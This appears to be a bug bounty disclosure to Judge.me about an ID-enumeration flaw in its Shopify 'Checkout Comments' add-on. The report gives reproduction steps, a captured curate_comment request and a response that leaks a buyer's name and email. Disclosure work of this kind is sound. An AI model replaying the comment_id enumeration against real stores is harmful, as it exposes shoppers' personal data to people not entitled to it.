## Original Report

HI @judgeme!
I noticed that the attacker can learn email users who left feedback at the time of buying.

Step to reproduce:

1. Login to our store and install your 'Checkout Comments' addon
2. Make fake order in or store and write a comment

███

3. Then go to our Shopify `/admin/apps/checkout-comments/extensions/checkout_comments/comments`
4. Publish our comment and Intercept request with burp. Send request to Repeater. Request example:

POST /extensions/checkout_comments/curate_comment HTTP/1.1
Host: judge.me
Cookie: _judgeme_session=████████████████; _ga=GA1.2.1935027813.1637882690; _gid=GA1.2.2043288340.1637882690; _fbp=fb.1.1637882690590.2069272048; _gat_UA-28424713-2=1

comment_id=1&curated=ok



5. Edit `comment_id=random_id` and in Response we can see buyer information (for example):


`{"comment":{"id":1,"content":"classic dress watch for weddings","created_at":"over 3 years ago","product":{"title":"Dress Watch","url":"https://████.myshopify.com/products/dress-watch"},"buyer":{"name":"F F","email":"██████████@gmail.com"},"published_status":true,"published_status_text":"Published","curated":"ok"}}`
